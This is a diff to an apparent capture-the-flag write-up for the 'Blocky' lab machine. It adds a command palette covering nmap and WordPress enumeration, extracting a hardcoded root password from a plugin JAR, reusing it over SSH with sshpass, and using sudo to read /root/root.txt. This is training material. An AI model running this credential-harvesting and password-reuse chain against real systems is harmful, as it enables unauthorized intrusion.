@@ -111,17 +111,71 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `wpscan/feroxbuster against blocky.htb`
-- `curl http://blocky.htb/plugins/BlockyCore.jar -O`
-- `jd-gui / javap / strings BlockyCore.jar`
-- `ssh notch@<target>`
-- `sudo -l`
-- `sudo cat /root/root.txt`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.16.114
+sudo nmap -sC -sV -Pn -p 21,22,80 -oN nmap_tcp.txt 10.129.16.114
+echo '10.129.16.114 blocky.htb' | sudo tee -a /etc/hosts
+curl -i http://blocky.htb/
+```
 
 </details>
+
+<details open>
+<summary><b>🌐 Web / WordPress Enumeration</b></summary>
+
+```bash
+wpscan --url http://blocky.htb/ --enumerate u,p,t
+feroxbuster -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+curl -s http://blocky.htb/plugins/
+```
+
+</details>
+
+<details open>
+<summary><b>☕ Plugin JAR Secret Extraction</b></summary>
+
+```bash
+wget http://blocky.htb/plugins/BlockyCore.jar -O BlockyCore.jar
+file BlockyCore.jar
+strings BlockyCore.jar | less
+
+# Or decompile locally
+mkdir blockycore && cd blockycore
+jar xf ../BlockyCore.jar
+grep -R "password\|jdbc\|mysql\|root" -n .
+
+# Secret recovered from plugin code/config
+# root / 8YsqfCTnvxAUeduzjNSXe22
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 SSH Password Reuse</b></summary>
+
+```bash
+sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh -o StrictHostKeyChecking=no notch@10.129.16.114 'id; hostname'
+sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh notch@10.129.16.114 'cat /home/notch/user.txt'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 sudo to root</b></summary>
+
+```bash
+sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh -tt notch@10.129.16.114 \
+  "printf '%s\n' '8YsqfCTnvxAUeduzjNSXe22' | sudo -S -l"
+
+sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh -tt notch@10.129.16.114 \
+  "printf '%s\n' '8YsqfCTnvxAUeduzjNSXe22' | sudo -S bash -c 'id; cat /root/root.txt'"
+```
+
+</details>
+
 
 ---
 
